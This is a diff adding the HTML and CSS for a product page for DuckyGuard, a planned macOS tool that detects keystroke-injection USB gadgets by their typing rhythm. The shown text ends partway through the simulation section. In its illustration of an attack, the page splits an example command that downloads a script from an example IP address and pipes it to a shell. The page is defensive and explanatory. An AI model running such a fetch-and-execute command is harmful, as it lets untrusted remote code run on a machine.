@@ -1,0 +1,475 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>DuckyGuard · a free Mac tool that spots USB gadgets typing like a machine</title>
+<meta name="description" content="DuckyGuard is a free macOS tool in development that watches typing rhythm for keystroke-injection USB devices (Rubber Ducky, Flipper Zero BadUSB), pulls focus away when a burst looks machine-typed, and writes an incident report. Runs locally. By sh. industries.">
+<link rel="canonical" href="https://shindustries.co/duckyguard/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="sh. industries">
+<meta property="og:title" content="DuckyGuard · a free Mac tool that spots USB gadgets typing like a machine">
+<meta property="og:description" content="DuckyGuard is a free macOS tool in development that watches typing rhythm for keystroke-injection USB devices (Rubber Ducky, Flipper Zero BadUSB), pulls focus away when a burst looks machine-typed, and writes an incident report. Runs locally. By sh. industries.">
+<meta property="og:url" content="https://shindustries.co/duckyguard/">
+<meta property="og:image" content="https://shindustries.co/assets/og/og-duckyguard.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="The DuckyGuard pixel duck with its orange shield, and the words: DuckyGuard, a free Mac tool">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="DuckyGuard · a free Mac tool that spots USB gadgets typing like a machine">
+<meta name="twitter:description" content="DuckyGuard is a free macOS tool in development that watches typing rhythm for keystroke-injection USB devices (Rubber Ducky, Flipper Zero BadUSB), pulls focus away when a burst looks machine-typed, and writes an incident report. Runs locally. By sh. industries.">
+<meta name="twitter:image" content="https://shindustries.co/assets/og/og-duckyguard.png">
+<meta name="color-scheme" content="light">
+<meta name="theme-color" content="#FDFBF7">
+<link rel="icon" type="image/png" href="assets/favicon-64.png">
+<link rel="apple-touch-icon" href="assets/favicon-64.png">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"SoftwareApplication","name":"DuckyGuard","url":"https://shindustries.co/duckyguard/","applicationCategory":"SecurityApplication","operatingSystem":"macOS (Apple Silicon)","softwareVersion":"in development, not yet released","description":"DuckyGuard is a free macOS tool in development that watches typing rhythm for keystroke-injection USB devices (Rubber Ducky, Flipper Zero BadUSB), pulls focus away when a burst looks machine-typed, and writes an incident report. Runs locally. By sh. industries.","offers":{"@type":"Offer","price":"0","priceCurrency":"USD","description":"Free for everyone. Optional pay-what-you-want support that unlocks nothing."},"author":{"@type":"Organization","@id":"https://shindustries.co/#org","name":"sh. industries","url":"https://shindustries.co/"}}</script>
+<style>
+/* Hallmark · macrostructure: scroll-story product (custom, brand-locked) · tone: technical-honest · anchor hue: matte orange #FF6B00
+ * DuckyGuard product page · staged in the sh. industries v6 site (Steven publishes).
+ * Claims on this page are limited to what products/duckyguard/CLAIMS_AUDIT.md marks verified,
+ * or are labeled as planned. Change claims there first. */
+@font-face{font-family:"Funnel Display";font-weight:700;font-display:swap;src:url(fonts/FunnelDisplay-700.ttf) format("truetype")}
+@font-face{font-family:"Funnel Display";font-weight:800;font-display:swap;src:url(fonts/FunnelDisplay-800.ttf) format("truetype")}
+@font-face{font-family:"Funnel Sans";font-weight:400;font-display:swap;src:url(fonts/FunnelSans-400.ttf) format("truetype")}
+@font-face{font-family:"Funnel Sans";font-weight:500;font-display:swap;src:url(fonts/FunnelSans-500.ttf) format("truetype")}
+@font-face{font-family:"Funnel Sans";font-weight:600;font-display:swap;src:url(fonts/FunnelSans-600.ttf) format("truetype")}
+@font-face{font-family:"Silkscreen";font-weight:400;font-display:swap;src:url(fonts/Silkscreen-Regular.ttf) format("truetype")} /* OFL 1.1, fonts/Silkscreen-OFL.txt, eyebrows only */
+
+:root{
+  --bg:#FDFBF7; --bg-warm:#FAF6EF; --surface:#FFFFFF; --surface-duck:#FFF8EB;
+  --line:#E8E2D5; --line-strong:#D5CEBF;
+  --text:#1C1917; --text-2:#57534E; --text-3:#6B6560;
+  --orange:#FF6B00;          /* matte shield orange: shapes, fills, wordmark. Solid, never a gradient. */
+  --orange-text:#B34700;     /* same hue, darkened for small text on ivory (WCAG AA) */
+  --yellow:#FFB800;
+  --ok:#0F7A55; --alarm:#B42318;
+  --fd:"Funnel Display","Funnel Sans",system-ui,sans-serif;
+  --fs:"Funnel Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
+  --fm:ui-monospace,"SF Mono",SFMono-Regular,Menlo,monospace;
+  --fpx:"Silkscreen","Funnel Sans",monospace;
+  --r:12px; --r-lg:18px;
+  --ease:cubic-bezier(.2,0,0,1);
+  --shadow:0 12px 32px -6px rgba(28,25,23,.10);
+  color-scheme:light;
+}
+*{box-sizing:border-box}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth;overflow-x:clip}
+@media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}*{transition:none!important}}
+body{margin:0;background:var(--bg);color:var(--text);font:400 16px/1.6 var(--fs);-webkit-font-smoothing:antialiased;overflow-x:clip}
+img{max-width:100%}
+a{color:inherit}
+:focus-visible{outline:2px solid var(--text);outline-offset:3px;border-radius:4px}
+.wrap{width:100%;max-width:1080px;margin:0 auto;padding:0 16px}
+@media (min-width:720px){.wrap{padding:0 28px}}
+.skip{position:absolute;left:-999px;top:8px;background:var(--text);color:var(--bg);padding:8px 12px;border-radius:8px;z-index:200}
+.skip:focus{left:8px}
+
+/* eyebrow (sh. pixel theme device 3) */
+.px{font-family:var(--fpx);font-size:11px;letter-spacing:.12em;text-transform:uppercase;-webkit-font-smoothing:none;color:var(--orange-text);margin:0 0 10px}
+
+/* wordmark lockup: pixel duck integrated left of the wordmark, one mark */
+.lockup{display:inline-flex;align-items:flex-end;gap:2px;text-decoration:none;line-height:1}
+.lockup img{display:block;image-rendering:auto;height:1.55em;width:auto;margin-bottom:-.06em}
+.wm{display:block;height:.94em;width:auto;overflow:visible;margin-bottom:.12em}
+.wm text{font-family:var(--fd);font-weight:800}
+.wm .o{fill:var(--orange)} .wm .k{fill:var(--text)}
+
+/* header */
+.hdr{position:sticky;top:0;z-index:50;background:rgba(253,251,247,.92);-webkit-backdrop-filter:blur(14px);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.hdr-in{display:flex;align-items:center;gap:14px;height:60px}
+.crumb{font-size:13px;color:var(--text-3);text-decoration:none;white-space:nowrap}
+.crumb:hover{color:var(--text);text-decoration:underline;text-underline-offset:3px}
+.hdr .lockup{font-size:20px}
+.nav{display:none;margin-left:auto;gap:2px;font-size:14px}
+.nav a{text-decoration:none;color:var(--text-2);padding:8px 11px;border-radius:999px}
+.nav a:hover{color:var(--text);background:var(--bg-warm)}
+.hdr .btn{margin-left:auto}
+@media (min-width:860px){.nav{display:flex}.hdr .btn{margin-left:8px}}
+.sep{color:var(--line-strong)}
+@media (max-width:439px){.crumb,.sep{display:none}}
+.btn{white-space:nowrap}
+
+/* buttons */
+.btn{appearance:none;display:inline-flex;align-items:center;justify-content:center;gap:8px;min-height:44px;padding:0 18px;border-radius:10px;border:1px solid var(--line-strong);background:var(--surface);color:var(--text);font:600 15px/1 var(--fs);text-decoration:none;cursor:pointer;transition:background .16s var(--ease),border-color .16s var(--ease),transform .16s var(--ease)}
+.btn:hover{border-color:var(--text-3)}
+.btn-orange{background:var(--orange);border-color:var(--orange);color:var(--text)}
+.btn-orange:hover{background:#F06400;border-color:#F06400}
+.btn-sm{min-height:40px;padding:0 14px;font-size:14px}
+.btn[aria-disabled="true"]{background:var(--bg-warm);border-color:var(--line);color:var(--text-3);cursor:not-allowed}
+.btn:active{transform:translateY(1px)}
+
+/* hero */
+.hero{padding:48px 0 28px}
+@media (min-width:720px){.hero{padding:72px 0 36px}}
+.status{display:inline-flex;align-items:center;gap:8px;font-size:13px;font-weight:600;color:var(--text-2);background:var(--surface-duck);border:1px solid var(--line);border-radius:999px;padding:5px 12px 5px 10px;margin:0 0 18px}
+.status i{width:8px;height:8px;background:var(--yellow);display:block}
+.hero-grid{display:grid;gap:28px;align-items:center}
+@media (min-width:900px){.hero-grid{grid-template-columns:1.25fr .75fr;gap:48px}}
+h1{font-family:var(--fd);font-weight:800;font-size:clamp(36px,7.2vw,60px);line-height:1.04;letter-spacing:-.04em;margin:0 0 18px;text-wrap:balance}
+.lede{font-size:clamp(17px,2.2vw,19px);color:var(--text-2);max-width:620px;margin:0 0 26px;text-wrap:pretty}
+.ctas{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:18px}
+.meta{display:flex;flex-wrap:wrap;gap:6px 14px;font:500 13px/1.4 var(--fm);color:var(--text-3);margin:0;padding:0;list-style:none}
+.meta li::before{content:"";display:inline-block;width:4px;height:4px;background:var(--orange);margin:0 8px 2px 0;vertical-align:middle}
+.mascot{justify-self:center;position:relative;width:min(260px,62vw)}
+.mascot img{display:block;width:100%;height:auto}
+.mascot::after{content:"";position:absolute;left:12%;right:12%;bottom:-6px;height:10px;background:rgba(28,25,23,.08);border-radius:50%}
+
+/* sections */
+section.s{padding:56px 0;border-top:1px solid var(--line)}
+@media (min-width:720px){section.s{padding:80px 0}}
+h2{font-family:var(--fd);font-weight:800;font-size:clamp(28px,4.4vw,40px);line-height:1.1;letter-spacing:-.03em;margin:0 0 12px;text-wrap:balance}
+.sub{color:var(--text-2);max-width:640px;margin:0 0 32px}
+
+/* simulator */
+.sim{background:var(--surface);border:1px solid var(--line);border-radius:var(--r-lg);box-shadow:var(--shadow);overflow:hidden}
+.sim-top{display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:8px;padding:12px 16px;background:var(--bg-warm);border-bottom:1px solid var(--line)}
+.sim-tag{font:600 12px/1.3 var(--fm);color:var(--text-2)}
+.sim-tag strong{color:var(--alarm)}
+.sim-body{padding:16px;display:grid;gap:14px}
+@media (min-width:720px){.sim-body{padding:22px}}
+.sim-ctl{display:flex;flex-wrap:wrap;gap:8px}
+.chart{position:relative;height:150px;border:1px solid var(--line);border-radius:10px;background:#FFFDF9}
+.chart canvas{display:block;width:100%;height:100%}
+.chart .lbl{position:absolute;font:600 11px/1 var(--fm);color:var(--text-3)}
+.readouts{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
+@media (min-width:720px){.readouts{grid-template-columns:repeat(4,1fr)}}
+.ro{border:1px solid var(--line);border-radius:10px;padding:10px 12px;background:var(--surface)}
+.ro dt{font-size:12px;color:var(--text-3);margin:0 0 2px}
+.ro dd{margin:0;font:700 20px/1.2 var(--fm);font-variant-numeric:tabular-nums}
+.verdict{font-size:15px;border-radius:10px;padding:12px 14px;background:var(--bg-warm);border:1px solid var(--line);min-height:50px}
+.verdict.hit{background:#FFF1E6;border-color:var(--orange)}
+.typebox label{display:block;font-size:14px;font-weight:600;margin-bottom:6px}
+.typebox textarea{width:100%;min-height:64px;resize:vertical;border:1px solid var(--line-strong);border-radius:10px;padding:10px 12px;font:400 16px/1.5 var(--fs);background:#FFFDF9;color:var(--text)}
+.note{font-size:13px;color:var(--text-3);margin:0}
+
+/* cards */
+.grid{display:grid;gap:14px}
+@media (min-width:720px){.grid.two{grid-template-columns:1fr 1fr}}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:22px}
+.card .n{font:700 12px/1 var(--fm);color:var(--orange-text);margin:0 0 10px}
+.card h3{font-family:var(--fd);font-weight:800;font-size:20px;letter-spacing:-.02em;margin:0 0 8px}
+.card p{margin:0;color:var(--text-2);font-size:15px}
+code{font-family:var(--fm);font-size:.9em;background:var(--bg-warm);border:1px solid var(--line);border-radius:5px;padding:1px 5px}
+
+/* proof table */
+.tbl{width:100%;border-collapse:collapse;font-size:15px;background:var(--surface);border:1px solid var(--line);border-radius:var(--r);overflow:hidden}
+.tbl th,.tbl td{text-align:left;padding:12px 14px;border-bottom:1px solid var(--line);vertical-align:top}
+.tbl th{font-size:13px;color:var(--text-3);font-weight:600;background:var(--bg-warm)}
+.tbl tr:last-child td{border-bottom:0}
+.tbl td:last-child{font-family:var(--fm);font-size:14px;white-space:nowrap}
+.tblwrap{overflow-x:auto;border-radius:var(--r)}
+
+/* limits */
+.limits{list-style:none;margin:0;padding:0;display:grid;gap:10px}
+.limits li{background:var(--surface);border:1px solid var(--line);border-left:4px solid var(--yellow);border-radius:10px;padding:14px 16px;color:var(--text-2)}
+.limits strong{color:var(--text)}
+
+/* pricing */
+.plans{display:grid;gap:16px}
+@media (min-width:760px){.plans{grid-template-columns:1fr 1fr}}
+.plan{background:var(--surface);border:1px solid var(--line);border-radius:var(--r-lg);padding:26px;display:flex;flex-direction:column;gap:14px}
+.plan.support{background:var(--surface-duck);border:2px solid var(--orange)}
+.plan h3{font-family:var(--fd);font-weight:800;font-size:22px;line-height:1.2;margin:0}
+.support-copy{margin:0;color:var(--text-2)}
+.chip{align-self:flex-start;font:600 12px/1 var(--fs);padding:6px 10px;border-radius:999px;background:var(--surface-duck);border:1px solid var(--line);color:var(--text-2)}
+.chip.soon{border-color:var(--orange);color:var(--orange-text)}
+.feat{list-style:none;margin:0;padding:0;display:grid;gap:9px;font-size:15px}
+.feat li{display:flex;gap:10px;align-items:flex-start}
+.feat li::before{content:"";flex:none;width:8px;height:8px;margin-top:8px;background:var(--orange)}
+.plan .btn{margin-top:auto;width:100%}
+.plan .note{text-align:center}
+
+/* get it */
+.get{background:var(--surface);border:1px solid var(--line);border-radius:var(--r-lg);padding:28px;display:grid;gap:22px;align-items:center}
+@media (min-width:760px){.get{grid-template-columns:auto 1fr;padding:36px}}
+.get img{width:96px;height:auto;display:block}
+.get h2{font-size:clamp(26px,3.6vw,34px)}
+.get p{margin:0 0 14px;color:var(--text-2)}
+.founder{margin-top:28px;display:grid;gap:4px;padding:20px 22px;border:1px solid var(--line);border-radius:var(--r);background:var(--bg-warm)}
+.founder p{margin:0;color:var(--text-2);font-size:15px}
+.founder strong{color:var(--text)}
+
+/* scroll story. No-JS / reduced motion: static final frame, captions as a list. */
+.story{border-top:1px solid var(--line);background:var(--bg-warm)}
+.stage{padding:56px 0}
+.st-in{display:grid;gap:24px}
+.cap{margin:0;padding-left:1.3em;color:var(--text-2);display:grid;gap:6px;max-width:640px}
+.cap li.on{color:var(--text)}
+.st-panels{display:grid;gap:12px;align-items:center}
+@media (min-width:820px){.st-panels{grid-template-columns:minmax(0,1fr) 150px minmax(0,1fr)}}
+.pane{margin:0;background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:12px 14px;min-height:96px}
+.pane figcaption{font-size:13px;font-weight:600;color:var(--text-3);margin-bottom:8px}
+.pane pre{margin:0;font:600 15px/1.5 var(--fm);white-space:pre-wrap;overflow-wrap:anywhere;min-height:1.5em}
+.term pre::after{content:"";display:inline-block;width:.55em;height:1.05em;background:var(--text);vertical-align:-.15em;margin-left:1px}
+.sandbox{border:2px solid var(--orange)}
+.sandbox pre{color:var(--orange-text)}
+.st-mid{position:relative;height:96px;display:flex;align-items:center;justify-content:center}
+.usb{width:96px;height:auto;image-rendering:pixelated}
+.shield{position:absolute;width:64px;height:auto;left:50%;top:50%;transform:translate(-50%,-50%)}
+html.js .story.live{height:300vh}
+html.js .story.live .stage{position:sticky;top:60px;min-height:calc(100svh - 60px);display:flex;align-items:center;padding:24px 0}
+html.js .story.live .cap{list-style:none;padding:0;position:relative;min-height:3.2em}
+html.js .story.live .cap li{position:absolute;inset:0 auto auto 0;opacity:0;transform:translateY(8px);transition:opacity .3s var(--ease),transform .3s var(--ease);font-size:clamp(17px,2.2vw,20px);color:var(--text)}
+html.js .story.live .cap li.on{opacity:1;transform:none}
+html.js .story.live .usb{transition:transform .5s var(--ease)}
+html.js .story.live .shield{transform:translate(-50%,-50%) scale(0);transition:transform .32s steps(4)}
+html.js .story.live .stage[data-step="0"] .usb{transform:translateX(-36px)}
+html.js .story.live .stage[data-step="2"] .shield,html.js .story.live .stage[data-step="3"] .shield{transform:translate(-50%,-50%) scale(1)}
+html.js .story.live .stage[data-step="2"] .usb,html.js .story.live .stage[data-step="3"] .usb{transform:translateX(-46px)}
+html.js .story.live .sandbox{border-color:var(--line);transition:border-color .3s var(--ease)}
+html.js .story.live .stage[data-step="2"] .sandbox,html.js .story.live .stage[data-step="3"] .sandbox{border-color:var(--orange)}
+@media (max-width:819px){html.js .story.live .stage{top:60px}.st-mid{height:72px}.pane{min-height:72px}}
+
+/* kinetic headline + tilt (transform/opacity only) */
+.mascot{transition:transform .25s var(--ease);transform-style:preserve-3d;will-change:transform}
+.mag{transition:transform .2s var(--ease),background .16s var(--ease)}
+@media (prefers-reduced-motion:no-preference){
+  h1 .w{display:inline-block;opacity:0;transform:translateY(.35em);animation:rise .6s var(--ease) forwards}
+  h1 .w:nth-child(2){animation-delay:.06s}h1 .w:nth-child(3){animation-delay:.12s}h1 .w:nth-child(4){animation-delay:.18s}h1 .w:nth-child(5){animation-delay:.24s}h1 .w:nth-child(6){animation-delay:.30s}h1 .w:nth-child(7){animation-delay:.36s}h1 .w:nth-child(8){animation-delay:.42s}
+  .mascot img{animation:hop 2.4s steps(4) 1s 2}
+}
+@keyframes rise{to{opacity:1;transform:none}}
+@keyframes hop{0%,40%,100%{transform:none}20%{transform:translateY(-6px)}}
+
+/* shared footer (same groups as the rest of shindustries.co; light palette from this page's tokens) */
+.gt{display:inline-grid;place-items:center;flex:0 0 auto;width:32px;height:32px;border-radius:9px;background:#0E0E0D;border:1px solid var(--line-strong)}
+.gt svg{width:72%;height:72%;image-rendering:pixelated}
+.ft{border-top:1px solid var(--line);background:var(--bg-warm);padding:56px 0 40px;color:var(--text-3);font-size:14.5px}
+.ft-top{display:grid;gap:40px}
+@media(min-width:900px){.ft-top{grid-template-columns:minmax(0,1.1fr) minmax(0,2fr);gap:64px}}
+.ft-brand .gt{width:44px;height:44px;border-radius:12px}
+.ft-brand .ft-tag{font:800 22px/1.15 var(--fd);letter-spacing:-.02em;color:var(--text);margin:16px 0 0;max-width:14em}
+.ft-brand .ft-co{margin:12px 0 0;max-width:30em;line-height:1.5}
+.ft-brand a{color:var(--text-2);text-decoration:underline;text-underline-offset:3px}
+.ft-brand a:hover{color:var(--text)}
+.ft-cols{display:grid;gap:28px 24px;grid-template-columns:repeat(2,minmax(0,1fr))}
+@media(min-width:720px){.ft-cols{grid-template-columns:repeat(4,minmax(0,1fr))}}
+.ft-h{font:600 12px/1 var(--fs);letter-spacing:.08em;text-transform:uppercase;color:var(--text-3);margin:0 0 14px}
+.ft-cols ul{list-style:none;margin:0;padding:0;display:grid;gap:9px}
+.ft-cols a{color:var(--text-2);text-decoration:none;display:inline-block}
+.ft-cols a:hover{color:var(--text);text-decoration:underline;text-underline-offset:3px}
+.ft-cols a small{display:block;font-size:12.5px;color:var(--text-3)}
+.ft-bot{display:flex;flex-wrap:wrap;gap:8px 24px;justify-content:space-between;align-items:center;margin-top:44px;padding-top:20px;border-top:1px solid var(--line);font-size:13.5px}
+.ft-bot .px{color:var(--text-3);margin:0}
+.ft-bot a{color:var(--text-2);text-decoration:underline;text-underline-offset:3px}
+.ft-bot a:hover{color:var(--text)}
+</style>
+</head>
+<body>
+<svg width="0" height="0" style="position:absolute" aria-hidden="true"><symbol id="glim" viewBox="0 0 16 16" shape-rendering="crispEdges"><rect x="6" y="0" width="1" height="1" fill="#F2F1EC"/><rect x="7" y="0" width="1" height="1" fill="#F2F1EC"/><rect x="8" y="0" width="1" height="1" fill="#F2F1EC"/><rect x="6" y="1" width="1" height="1" fill="#F2F1EC"/><rect x="8" y="1" width="1" height="1" fill="#F2F1EC"/><rect x="4" y="2" width="1" height="1" fill="#F2F1EC"/><rect x="5" y="2" width="1" height="1" fill="#F2F1EC"/><rect x="6" y="2" width="1" height="1" fill="#F2F1EC"/><rect x="8" y="2" width="1" height="1" fill="#F2F1EC"/><rect x="9" y="2" width="1" height="1" fill="#F2F1EC"/><rect x="10" y="2" width="1" height="1" fill="#F2F1EC"/><rect x="11" y="2" width="1" height="1" fill="#F2F1EC"/><rect x="3" y="3" width="1" height="1" fill="#F2F1EC"/><rect x="4" y="3" width="1" height="1" fill="#F2F1EC"/><rect x="11" y="3" width="1" height="1" fill="#F2F1EC"/><rect x="12" y="3" width="1" height="1" fill="#F2F1EC"/><rect x="2" y="4" width="1" height="1" fill="#F2F1EC"/><rect x="3" y="4" width="1" height="1" fill="#F2F1EC"/><rect x="12" y="4" width="1" height="1" fill="#F2F1EC"/><rect x="13" y="4" width="1" height="1" fill="#F2F1EC"/><rect x="2" y="5" width="1" height="1" fill="#F2F1EC"/><rect x="13" y="5" width="1" height="1" fill="#F2F1EC"/><rect x="2" y="6" width="1" height="1" fill="#F2F1EC"/><rect x="13" y="6" width="1" height="1" fill="#F2F1EC"/><rect x="2" y="7" width="1" height="1" fill="#F2F1EC"/><rect x="13" y="7" width="1" height="1" fill="#F2F1EC"/><rect x="2" y="8" width="1" height="1" fill="#F2F1EC"/><rect x="13" y="8" width="1" height="1" fill="#F2F1EC"/><rect x="2" y="9" width="1" height="1" fill="#F2F1EC"/><rect x="13" y="9" width="1" height="1" fill="#F2F1EC"/><rect x="2" y="10" width="1" height="1" fill="#F2F1EC"/><rect x="13" y="10" width="1" height="1" fill="#F2F1EC"/><rect x="2" y="11" width="1" height="1" fill="#F2F1EC"/><rect x="3" y="11" width="1" height="1" fill="#F2F1EC"/><rect x="12" y="11" width="1" height="1" fill="#F2F1EC"/><rect x="13" y="11" width="1" height="1" fill="#F2F1EC"/><rect x="3" y="12" width="1" height="1" fill="#F2F1EC"/><rect x="4" y="12" width="1" height="1" fill="#F2F1EC"/><rect x="11" y="12" width="1" height="1" fill="#F2F1EC"/><rect x="12" y="12" width="1" height="1" fill="#F2F1EC"/><rect x="3" y="13" width="1" height="1" fill="#F2F1EC"/><rect x="4" y="13" width="1" height="1" fill="#F2F1EC"/><rect x="6" y="13" width="1" height="1" fill="#F2F1EC"/><rect x="7" y="13" width="1" height="1" fill="#F2F1EC"/><rect x="8" y="13" width="1" height="1" fill="#F2F1EC"/><rect x="9" y="13" width="1" height="1" fill="#F2F1EC"/><rect x="11" y="13" width="1" height="1" fill="#F2F1EC"/><rect x="12" y="13" width="1" height="1" fill="#F2F1EC"/><rect x="3" y="14" width="1" height="1" fill="#F2F1EC"/><rect x="6" y="14" width="1" height="1" fill="#F2F1EC"/><rect x="9" y="14" width="1" height="1" fill="#F2F1EC"/><rect x="12" y="14" width="1" height="1" fill="#F2F1EC"/><rect x="3" y="15" width="1" height="1" fill="#F2F1EC"/><rect x="4" y="15" width="1" height="1" fill="#F2F1EC"/><rect x="5" y="15" width="1" height="1" fill="#F2F1EC"/><rect x="6" y="15" width="1" height="1" fill="#F2F1EC"/><rect x="9" y="15" width="1" height="1" fill="#F2F1EC"/><rect x="10" y="15" width="1" height="1" fill="#F2F1EC"/><rect x="11" y="15" width="1" height="1" fill="#F2F1EC"/><rect x="12" y="15" width="1" height="1" fill="#F2F1EC"/><rect x="7" y="2" width="1" height="1" fill="#1A1A17"/><rect x="5" y="3" width="6" height="1" fill="#1A1A17"/><rect x="4" y="4" width="8" height="1" fill="#1A1A17"/><rect x="3" y="5" width="10" height="1" fill="#1A1A17"/><rect x="3" y="6" width="1" height="1" fill="#1A1A17"/><rect x="4" y="6" width="2" height="1" fill="#F2F1EC"/><rect x="6" y="6" width="4" height="1" fill="#1A1A17"/><rect x="10" y="6" width="2" height="1" fill="#F2F1EC"/><rect x="12" y="6" width="1" height="1" fill="#1A1A17"/><rect x="3" y="7" width="1" height="1" fill="#1A1A17"/><rect x="4" y="7" width="1" height="1" fill="#F2F1EC"/><rect x="5" y="7" width="5" height="1" fill="#1A1A17"/><rect x="10" y="7" width="1" height="1" fill="#F2F1EC"/><rect x="11" y="7" width="2" height="1" fill="#1A1A17"/><rect x="3" y="8" width="10" height="1" fill="#1A1A17"/><rect x="3" y="9" width="4" height="1" fill="#1A1A17"/><rect x="7" y="9" width="2" height="1" fill="#F2F1EC"/><rect x="9" y="9" width="4" height="1" fill="#1A1A17"/><rect x="3" y="10" width="10" height="1" fill="#1A1A17"/><rect x="4" y="11" width="8" height="1" fill="#1A1A17"/><rect x="5" y="12" width="6" height="1" fill="#1A1A17"/><rect x="5" y="13" width="1" height="1" fill="#1A1A17"/><rect x="10" y="13" width="1" height="1" fill="#1A1A17"/><rect x="4" y="14" width="2" height="1" fill="#1A1A17"/><rect x="10" y="14" width="2" height="1" fill="#1A1A17"/><circle cx="7.5" cy="1.5" r="2.4" fill="#C6FF3D" opacity=".28"/><circle cx="7.5" cy="1.5" r="1.4" fill="#C6FF3D" opacity=".55"/><rect x="7" y="1" width="1" height="1" fill="#C6FF3D"/></symbol></svg>
+<a class="skip" href="#main">Skip to content</a>
+
+<header class="hdr"><div class="wrap hdr-in">
+  <a class="crumb" href="../products.html">sh. industries</a><span class="sep" aria-hidden="true">/</span>
+  <a class="lockup" href="#main" aria-label="DuckyGuard. home"><img src="assets/duck-96.png" alt="" width="84" height="96"><svg class="wm" viewBox="0 -72 606 94" aria-hidden="true" focusable="false"><text y="0" font-size="100" letter-spacing="-3.5"><tspan class="o">Ducky</tspan><tspan class="k">Guard</tspan><tspan class="o">.</tspan></text></svg></a>
+  <nav class="nav" aria-label="DuckyGuard"><a href="#story">The attack</a><a href="#demo">Simulation</a><a href="#limits">Limits</a><a href="#free">Free</a></nav>
+  <a class="btn btn-sm" href="#get" data-dl-short>Get notified</a>
+</div></header>
+
+<main id="main">
+
+<section class="hero"><div class="wrap hero-grid">
+  <div>
+    <p class="status"><i aria-hidden="true"></i>In development · early macOS build, not released yet</p>
+    <h1><span class="w">Catch</span> <span class="w">the</span> <span class="w">USB</span> <span class="w">stick</span> <span class="w">that</span> <span class="w">types</span> <span class="w">like</span> <span class="w">a&nbsp;machine.</span></h1>
+    <p class="lede">Keystroke-injection gadgets like the Rubber Ducky and Flipper Zero's BadUSB mode pretend to be a keyboard and type a script in seconds. DuckyGuard watches typing rhythm on your Mac. When a burst is too fast and too evenly timed to be a person, it pulls focus to its own window, records the rest of the burst, and writes an incident report with a ready-made YARA rule.</p>
+    <div class="ctas">
+      <a class="btn btn-orange mag" href="#get" data-dl-main>Download soon · get notified</a>
+      <a class="btn" href="#limits">Read the limits first</a>
+    </div>
+    <ul class="meta" aria-label="Facts">
+      <li>macOS, Apple Silicon</li>
+      <li>No kernel extension</li>
+      <li>Runs locally, sends nothing</li>
+      <li>Free for everyone</li>
+    </ul>
+  </div>
+  <div class="mascot"><img src="assets/duck-256.png" alt="DuckyGuard mascot: a pixel-art yellow duck holding an orange shield with a USB symbol" width="224" height="256"></div>
+</div></section>
+
+<section class="story" id="story" aria-labelledby="stH">
+  <div class="stage" data-step="3">
+    <div class="wrap st-in">
+      <div class="st-head">
+        <h2 id="stH">Twelve keys, then the duck steps in.</h2>
+        <ol class="cap">
+          <li>A gadget plugs in and tells your Mac it's a keyboard.</li>
+          <li>It types a command far faster and more evenly than any person.</li>
+          <li>By key 12 the score crosses 0.70. DuckyGuard pulls focus to its own window.</li>
+          <li class="on">If focus moves in time, the rest, Enter included, lands in DuckyGuard's capture file instead of your terminal. Then the report is written.</li>
+        </ol>
+      </div>
+      <div class="st-panels">
+        <figure class="pane term"><figcaption>Your open terminal</figcaption><pre id="stTerm" aria-hidden="true">curl -s http</pre></figure>
+        <div class="st-mid" aria-hidden="true">
+          <svg class="usb" viewBox="0 0 24 10" shape-rendering="crispEdges"><rect x="0" y="2" width="5" height="6" fill="#A8A29E"/><rect x="1" y="3" width="1" height="1" fill="#1C1917"/><rect x="1" y="6" width="1" height="1" fill="#1C1917"/><rect x="5" y="0" width="17" height="10" fill="#1C1917"/><rect x="22" y="2" width="2" height="6" fill="#1C1917"/><rect x="8" y="3" width="2" height="2" fill="#FF6B00"/><rect x="12" y="3" width="2" height="2" fill="#FF6B00"/><rect x="16" y="3" width="2" height="2" fill="#FF6B00"/><rect x="8" y="6" width="10" height="1" fill="#57534E"/></svg>
+          <img class="shield" src="assets/duck-96.png" alt="" width="84" height="96">
+        </div>
+        <figure class="pane sandbox"><figcaption>DuckyGuard capture file</figcaption><pre id="stBox" aria-hidden="true">://198.51.100.42/x.sh | sh⏎</pre></figure>
+      </div>
+      <p class="note st-note">Illustration of the design, timed to the detector's 12-key window. The command and address are examples.</p>
+    </div>
+  </div>
+</section>
+
+<section class="s" id="demo"><div class="wrap">
+  <p class="px">Simulation</p>
+  <h2>See the timing check score a burst.</h2>
+  <p class="sub">This runs the same scoring rules as DuckyGuard's detector, in your browser, on replayed or typed input. It is a simulation: nothing on your computer is being protected or monitored here, and nothing you type leaves this page.</p>
+
+  <div class="sim" role="region" aria-label="Keystroke timing simulation">
+    <div class="sim-top">
+      <span class="sim-tag"><strong>SIMULATION</strong> · not a real detection · same thresholds as <code>detector.py</code></span>
+      <span class="sim-tag" id="simSrc">Idle</span>
+    </div>
+    <div class="sim-body">
+      <div class="sim-ctl">
+        <button class="btn btn-orange btn-sm" type="button" id="bMachine">Replay: machine, 12 ms/key</button>
+        <button class="btn btn-sm" type="button" id="bEven30">Replay: even, 30 ms/key</button>
+        <button class="btn btn-sm" type="button" id="bHuman">Replay: human typing</button>
+      </div>
+      <div class="chart">
+        <canvas id="cv" aria-hidden="true"></canvas>
+        <span class="lbl" style="top:8px;left:10px">Score, last 60 keys</span>
+        <span class="lbl" id="thLbl" style="right:10px">Trigger 0.70</span>
+      </div>
+      <dl class="readouts">
+        <div class="ro"><dt>Speed</dt><dd id="rCps">0.0 keys/s</dd></div>
+        <div class="ro"><dt>Timing spread</dt><dd id="rJit">n/a</dd></div>
+        <div class="ro"><dt>Score</dt><dd id="rConf">0.00</dd></div>
+        <div class="ro"><dt>Keys seen</dt><dd id="rKeys">0</dd></div>
+      </dl>
